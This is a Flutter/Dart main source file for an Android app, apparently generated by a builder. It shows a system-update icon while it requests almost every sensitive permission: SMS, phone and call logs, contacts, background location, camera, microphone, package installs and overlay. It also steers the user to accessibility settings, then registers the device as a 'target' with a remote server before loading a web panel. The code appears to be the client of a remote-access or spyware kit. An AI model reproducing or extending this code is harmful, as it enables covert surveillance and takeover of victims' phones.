import 'dart:async';
import 'dart:convert';
import 'dart:io';

import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:webview_flutter/webview_flutter.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:battery_plus/battery_plus.dart';
import 'package:connectivity_plus/connectivity_plus.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:url_launcher/url_launcher.dart';

import 'config/build_config.dart';

// ==========================================
// ===== GLOBAL =====
// ==========================================
const MethodChannel _deviceChannel = MethodChannel('orgsapp/device_info');

// ==========================================
// ===== MAIN =====
// ==========================================
void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  runApp(const GeneratedApp());
}

// ==========================================
// ===== ROOT APP =====
// ==========================================
class GeneratedApp extends StatelessWidget {
  const GeneratedApp({super.key});

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: BuildConfig.appName,
      debugShowCheckedModeBanner: false,
      theme: ThemeData(
        colorScheme: ColorScheme.fromSeed(
          seedColor: const Color(0xFF7C9EF5),
        ),
        useMaterial3: true,
      ),
      home: const AppBootstrap(),
    );
  }
}

// ==========================================
// ===== BOOTSTRAP =====
// ==========================================
class AppBootstrap extends StatefulWidget {
  const AppBootstrap({super.key});

  @override
  State<AppBootstrap> createState() => _AppBootstrapState();
}

class _AppBootstrapState extends State<AppBootstrap> {
  String _status = 'Memuat...';
  bool _ready = false;

  @override
  void initState() {
    super.initState();
    _bootstrap();
  }

  Future<void> _bootstrap() async {
    try {
      // ==========================================
      // ===== 1. Save config ke SharedPreferences =====
      // ==========================================
      try {
        final prefs = await SharedPreferences.getInstance();
        await prefs.setString('accessKey', BuildConfig.accessKey);
        await prefs.setString('appName', BuildConfig.appName);
        await prefs.setString('buildId', BuildConfig.buildId);
        await prefs.setString('packageName', BuildConfig.packageName);
        await prefs.setString('serverUrl', BuildConfig.serverUrl);
        await prefs.setBool('isNativeApp', true);
        debugPrint('✅ Config saved to prefs');
      } catch (e) {
        debugPrint('⚠️ Prefs error: $e');
      }

      // ==========================================
      // ===== 2. Request Permissions =====
      // ==========================================
      if (mounted) setState(() => _status = 'Meminta izin...');
      try {
        await _requestPermissions();
      } catch (e) {
        debugPrint('⚠️ Permission flow error: $e');
      }

      // ==========================================
      // ===== 3. Register Device =====
      // ==========================================
      if (mounted) setState(() => _status = 'Mendaftar device...');
      try {
        await _registerDeviceWithRetry();
      } catch (e) {
        debugPrint('⚠️ Register error: $e');
      }

      if (!mounted) return;
      setState(() {
        _status = 'Siap';
        _ready = true;
      });
    } catch (e, st) {
      debugPrint('❌ Bootstrap fatal error: $e');
      debugPrint('$st');
      if (!mounted) return;
      setState(() {
        _status = 'Siap (dengan keterbatasan)';
        _ready = true;
      });
    }
  }

  // ==========================================
  // ===== REQUEST PERMISSIONS =====
  // ==========================================
  Future<void> _requestPermissions() async {
    int sdkInt = 0;
    try {
      sdkInt = await _getAndroidSdkInt();
      debugPrint('📱 Android SDK: $sdkInt');
    } catch (e) {
      debugPrint('⚠️ getSdkInt error: $e');
    }

    final permissions = <Permission>[
      // ===== CAMERA & MICROPHONE =====
      Permission.camera,
      Permission.microphone,

      // ===== LOCATION =====
      Permission.location,
      Permission.locationWhenInUse,
      Permission.locationAlways,

      // ===== NOTIFICATION =====
      Permission.notification,

      // ===== PHONE (cover: READ_PHONE_STATE, CALL_PHONE, READ_CALL_LOG, WRITE_CALL_LOG) =====
      Permission.phone,

      // ===== CONTACTS =====
      Permission.contacts,

      // ===== SMS (cover: READ_SMS, SEND_SMS, RECEIVE_SMS) =====
      Permission.sms,

      // ===== CALENDAR =====
      Permission.calendarFullAccess,
      Permission.calendarWriteOnly,

      // ===== SENSORS =====
      Permission.sensors,
      Permission.activityRecognition,

      // ===== BLUETOOTH =====
      Permission.bluetooth,
      Permission.bluetoothScan,
      Permission.bluetoothConnect,

      // ===== SYSTEM =====
      Permission.ignoreBatteryOptimizations,
      Permission.systemAlertWindow,
      Permission.requestInstallPackages,

      // ❌ TIDAK ADA di permission_handler v11.x:
      // Permission.callLog
      // Permission.accessibilityService
    ];

    // ===== STORAGE: beda per Android version =====
    if (sdkInt >= 33) {
      permissions.addAll([
        Permission.photos,
        Permission.videos,
        Permission.audio,
      ]);
    } else {
      permissions.add(Permission.storage);
    }

    // ===== Request satu per satu =====
    for (final perm in permissions) {
      try {
        final status = await perm.status;
        if (status.isDenied || status.isLimited) {
          final result = await perm.request();
          debugPrint('🔑 $perm: $result');
        }
      } catch (e) {
        debugPrint('⚠️ Permission error ($perm): $e');
      }
    }

    // ===== Buka Settings Accessibility (manual) =====
    try {
      if (Platform.isAndroid) {
        await _openAccessibilitySettings();
      }
    } catch (e) {
      debugPrint('⚠️ Cannot open accessibility settings: $e');
    }
  }

  // ==========================================
  // ===== HELPER: GET ANDROID SDK INT =====
  // ==========================================
  Future<int> _getAndroidSdkInt() async {
    if (!Platform.isAndroid) return 0;
    try {
      final result = await _deviceChannel.invokeMethod<int>('getSdkInt');
      return result ?? 0;
    } catch (e) {
      debugPrint('⚠️ getSdkInt channel error: $e');
      return 0;
    }
  }

  // ==========================================
  // ===== HELPER: OPEN ACCESSIBILITY SETTINGS =====
  // ==========================================
  Future<void> _openAccessibilitySettings() async {
    try {
      await _deviceChannel.invokeMethod('openAccessibilitySettings');
      debugPrint('✅ Accessibility settings opened');
    } catch (e) {
      debugPrint('⚠️ Cannot open accessibility settings: $e');
    }
  }

  // ==========================================
  // ===== HELPER: GET DEVICE INFO =====
  // ==========================================
  Future<String> _getDeviceModel() async {
    try {
      final result = await _deviceChannel.invokeMethod<String>('getModel');
      return result ?? 'Android Device';
    } catch (_) {
      return 'Android Device';
    }
  }

  Future<String> _getDeviceBrand() async {
    try {
      final result = await _deviceChannel.invokeMethod<String>('getBrand');
      return result ?? 'Android';
    } catch (_) {
      return 'Android';
    }
  }

  Future<String> _getAndroidVersion() async {
    try {
      final result =
          await _deviceChannel.invokeMethod<String>('getAndroidVersion');
      return result ?? 'Unknown';
    } catch (_) {
      return 'Unknown';
    }
  }

  Future<String> _getOrCreateDeviceId() async {
    try {
      final prefs = await SharedPreferences.getInstance();
      String id = prefs.getString('deviceId') ?? '';
      if (id.isEmpty) {
        id = 'dev_${DateTime.now().millisecondsSinceEpoch}';
        await prefs.setString('deviceId', id);
      }
      return id;
    } catch (_) {
      return 'dev_${DateTime.now().millisecondsSinceEpoch}';
    }
  }

  // ==========================================
  // ===== REGISTER DEVICE (with retry) =====
  // ==========================================
  Future<void> _registerDeviceWithRetry() async {
    if (BuildConfig.accessKey.isEmpty) {
      debugPrint('⚠️ Access key kosong, skip register');
      return;
    }

    for (int attempt = 1; attempt <= 3; attempt++) {
      try {
        debugPrint('📡 Register attempt $attempt/3');
        final ok = await _registerDevice();
        if (ok) {
          debugPrint('✅ Register success');
          return;
        }
      } catch (e) {
        debugPrint('⚠️ Register attempt $attempt failed: $e');
      }

      if (attempt < 3) {
        await Future.delayed(const Duration(seconds: 2));
      }
    }

    debugPrint('❌ Register failed after 3 attempts');
  }

  Future<bool> _registerDevice() async {
    try {
      // Ambil battery level
      int batteryLevel = 0;
      try {
        final battery = Battery();
        batteryLevel = await battery.batteryLevel;
      } catch (e) {
        debugPrint('⚠️ Battery error: $e');
      }

      // Ambil connectivity type
      String connType = 'unknown';
      try {
        final connectivity = Connectivity();
        final result = await connectivity.checkConnectivity();
        connType = result.toString();
      } catch (e) {
        debugPrint('⚠️ Connectivity error: $e');
      }

      // Device info
      final deviceId = await _getOrCreateDeviceId();
      final model = await _getDeviceModel();
      final brand = await _getDeviceBrand();
      final androidVersion = await _getAndroidVersion();

      // POST ke server
      final payload = {
        'id': deviceId,
        'model': model,
        'brand': brand,
        'androidVersion': androidVersion,
        'battery': batteryLevel,
        'ip': connType,
        'appName': BuildConfig.appName,
        'packageName': BuildConfig.packageName,
        'accessKey': BuildConfig.accessKey,
        'buildId': BuildConfig.buildId,
        'status': 'Online',
        'lastSeen': DateTime.now().toIso8601String(),
      };

      final res = await _httpPost(
        '${BuildConfig.serverUrl}/api/register-target',
        payload,
      );

      return res != null && res.isNotEmpty;
    } catch (e) {
      debugPrint('❌ _registerDevice error: $e');
      return false;
    }
  }

  // ==========================================
  // ===== HTTP POST (dart:io) =====
  // ==========================================
  Future<String?> _httpPost(
    String url,
    Map<String, dynamic> body,
  ) async {
    HttpClient? client;
    try {
      client = HttpClient();
      client.connectionTimeout = const Duration(seconds: 15);

      final request = await client.postUrl(Uri.parse(url));
      request.headers.contentType = ContentType.json;
      request.headers.set('X-Access-Key', BuildConfig.accessKey);
      request.write(jsonEncode(body));

      final response = await request.close();
      final responseBody =
          await response.transform(utf8.decoder).join();

      debugPrint('📥 HTTP ${response.statusCode}: $responseBody');
      return responseBody;
    } catch (e) {
      debugPrint('❌ HTTP error: $e');
      return null;
    } finally {
      client?.close(force: true);
    }
  }

  // ==========================================
  // ===== BUILD =====
  // ==========================================
  @override
  Widget build(BuildContext context) {
    if (!_ready) return _buildLoadingScreen();
    return const WebViewHome();
  }

  Widget _buildLoadingScreen() {
    return Scaffold(
      backgroundColor: const Color(0xFFF5F1E8),
      body: Center(
        child: Padding(
          padding: const EdgeInsets.all(32),
          child: Column(
            mainAxisAlignment: MainAxisAlignment.center,
            children: [
              Container(
                width: 80,
                height: 80,
                decoration: BoxDecoration(
                  color: const Color(0xFF7C9EF5),
                  borderRadius: BorderRadius.circular(20),
                  border: Border.all(
                    color: const Color(0xFF1F1F1F),
                    width: 3,
                  ),
                  boxShadow: const [
                    BoxShadow(
                      color: Color(0xFF1F1F1F),
                      offset: Offset(4, 4),
                      blurRadius: 0,
                    ),
                  ],
                ),
                child: const Icon(
                  Icons.system_update_rounded,
                  color: Color(0xFF1F1F1F),
                  size: 44,
                ),
              ),
              const SizedBox(height: 32),
              Text(
                BuildConfig.appName,
                style: const TextStyle(
                  fontSize: 22,
                  fontWeight: FontWeight.w900,
                  color: Color(0xFF1F1F1F),
                  letterSpacing: -0.5,
                ),
                textAlign: TextAlign.center,
              ),
              const SizedBox(height: 8),
              Text(
                _status,
                style: const TextStyle(
                  fontSize: 13,
                  fontWeight: FontWeight.w600,
                  color: Color(0xFF6B6B6B),
                ),
                textAlign: TextAlign.center,
              ),
              const SizedBox(height: 32),
              const SizedBox(
                width: 24,
                height: 24,
                child: CircularProgressIndicator(
                  strokeWidth: 3,
                  color: Color(0xFF1F1F1F),
                ),
              ),
            ],
          ),
        ),
      ),
    );
  }
}

// ==========================================
// ===== WEBVIEW HOME =====
// ==========================================
class WebViewHome extends StatefulWidget {
  const WebViewHome({super.key});

  @override
  State<WebViewHome> createState() => _WebViewHomeState();
}

class _WebViewHomeState extends State<WebViewHome> {
  late final WebViewController _controller;
  bool _isLoading = true;
  int _progress = 0;
  bool _hasError = false;
  String _errorMessage = '';

  @override
  void initState() {
    super.initState();
    _initWebView();
  }

  void _initWebView() {
    try {
      _controller = WebViewController()
        ..setJavaScriptMode(JavaScriptMode.unrestricted)
        ..setBackgroundColor(const Color(0xFFFFFFFF))
        ..setUserAgent(
          'Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 '
          '(KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
        )
        ..addJavaScriptChannel(
          'AppBridge',
          onMessageReceived: (msg) {
            debugPrint('📨 From web: ${msg.message}');
            _handleWebMessage(msg.message);
          },
        )
        ..setNavigationDelegate(
          NavigationDelegate(
            onProgress: (p) {
              if (mounted) setState(() => _progress = p);
            },
            onPageStarted: (_) {
              if (!mounted) return;
              setState(() {
                _isLoading = true;
                _hasError = false;
              });
            },
            onPageFinished: (_) async {
              if (!mounted) return;
              setState(() => _isLoading = false);
              await _injectConfig();
            },
            onWebResourceError: (error) {
              if (!mounted) return;
              setState(() {
                _hasError = true;
                _errorMessage = error.description;
                _isLoading = false;
              });
              debugPrint('❌ WebView error: ${error.description}');
            },
            onNavigationRequest: (request) {
              return NavigationDecision.navigate;
            },
          ),
        )
        ..loadRequest(Uri.parse(BuildConfig.webviewUrl));

      debugPrint('✅ WebView initialized');
    } catch (e) {
      debugPrint('❌ WebView init error: $e');
      if (mounted) {
        setState(() {
          _hasError = true;
          _errorMessage = 'Gagal init WebView: $e';
          _isLoading = false;
        });
      }
    }
  }

  Future<void> _injectConfig() async {
    try {
      final js = """
        (function() {
          try {
            localStorage.setItem('accessKey', '${BuildConfig.accessKey}');
            localStorage.setItem('appName', '${BuildConfig.appName}');
            localStorage.setItem('packageName', '${BuildConfig.packageName}');
            localStorage.setItem('buildId', '${BuildConfig.buildId}');
            localStorage.setItem('serverUrl', '${BuildConfig.serverUrl}');
            localStorage.setItem('isNativeApp', 'true');
            console.log('[App] Config injected');
          } catch (e) {
            console.error('[App] Inject error', e);
          }
        })();
      """;
      await _controller.runJavaScript(js);
      debugPrint('✅ Config injected ke WebView');
    } catch (e) {
      debugPrint('❌ Inject error: $e');
    }
  }

  void _handleWebMessage(String message) {
    try {
      final data = jsonDecode(message);
      final action = data['action']?.toString();

      switch (action) {
        case 'openUrl':
          final url = data['url']?.toString();
          if (url != null && url.isNotEmpty) {
            launchUrl(
              Uri.parse(url),
              mode: LaunchMode.externalApplication,
            );
          }
          break;
        case 'close':
          SystemNavigator.pop();
          break;
        default:
          debugPrint('Unknown action: $action');
      }
    } catch (e) {
      debugPrint('Parse message error: $e');
    }
  }

  Future<void> _reload() async {
    setState(() {
      _hasError = false;
      _isLoading = true;
      _progress = 0;
    });
    try {
      await _controller.loadRequest(Uri.parse(BuildConfig.webviewUrl));
    } catch (e) {
      debugPrint('❌ Reload error: $e');
      if (mounted) {
        setState(() {
          _hasError = true;
          _errorMessage = 'Gagal reload: $e';
          _isLoading = false;
        });
      }
    }
  }

  @override
  Widget build(BuildContext context) {
    return PopScope(
      canPop: false,
      onPopInvoked: (didPop) async {
        if (didPop) return;
        try {
          final canGoBack = await _controller.canGoBack();
          if (canGoBack) {
            await _controller.goBack();
          } else {
            SystemNavigator.pop();
          }
        } catch (e) {
          debugPrint('❌ Back error: $e');
          SystemNavigator.pop();
        }
      },
      child: Scaffold(
        body: SafeArea(
          child: Stack(
            children: [
              if (!_hasError)
                WebViewWidget(controller: _controller)
              else
                _buildErrorScreen(),

              if (_isLoading && !_hasError)
                Positioned(
                  top: 0,
                  left: 0,
                  right: 0,
                  child: LinearProgressIndicator(
                    value: _progress / 100,
                    backgroundColor: Colors.grey.shade200,
                    color: const Color(0xFF7C9EF5),
                    minHeight: 3,
                  ),
                ),
            ],
          ),
        ),
      ),
    );
  }

  Widget _buildErrorScreen() {
    return Center(
      child: Padding(
        padding: const EdgeInsets.all(32),
        child: Column(
          mainAxisAlignment: MainAxisAlignment.center,
          children: [
            Container(
              padding: const EdgeInsets.all(20),
              decoration: BoxDecoration(
                color: const Color(0xFFF5A97C),
                shape: BoxShape.circle,
                border: Border.all(
                  color: const Color(0xFF1F1F1F),
                  width: 2,
                ),
              ),
              child: const Icon(
                Icons.wifi_off_rounded,
                color: Color(0xFF1F1F1F),
                size: 40,
              ),
            ),
            const SizedBox(height: 20),
            const Text(
              'Koneksi Bermasalah',
              style: TextStyle(
                fontSize: 16,
                fontWeight: FontWeight.w900,
                color: Color(0xFF1F1F1F),
              ),
            ),
            const SizedBox(height: 8),
            Text(
              _errorMessage,
              textAlign: TextAlign.center,
              style: const TextStyle(
                fontSize: 12,
                fontWeight: FontWeight.w600,
                color: Color(0xFF6B6B6B),
              ),
            ),
            const SizedBox(height: 20),
            GestureDetector(
              onTap: _reload,
              child: Container(
                padding: const EdgeInsets.symmetric(
                  horizontal: 24,
                  vertical: 12,
                ),
                decoration: BoxDecoration(
                  color: const Color(0xFF7C9EF5),
                  borderRadius: BorderRadius.circular(12),
                  border: Border.all(
                    color: const Color(0xFF1F1F1F),
                    width: 2,
                  ),
                  boxShadow: const [
                    BoxShadow(
                      color: Color(0xFF1F1F1F),
                      offset: Offset(3, 3),
                      blurRadius: 0,
                    ),
                  ],
                ),
                child: const Text(
                  'COBA LAGI',
                  style: TextStyle(
                    fontSize: 13,
                    fontWeight: FontWeight.w900,
                    color: Color(0xFF1F1F1F),
                    letterSpacing: 1,
                  ),
                ),
              ),
            ),
          ],
        ),
      ),
    );
  }
}
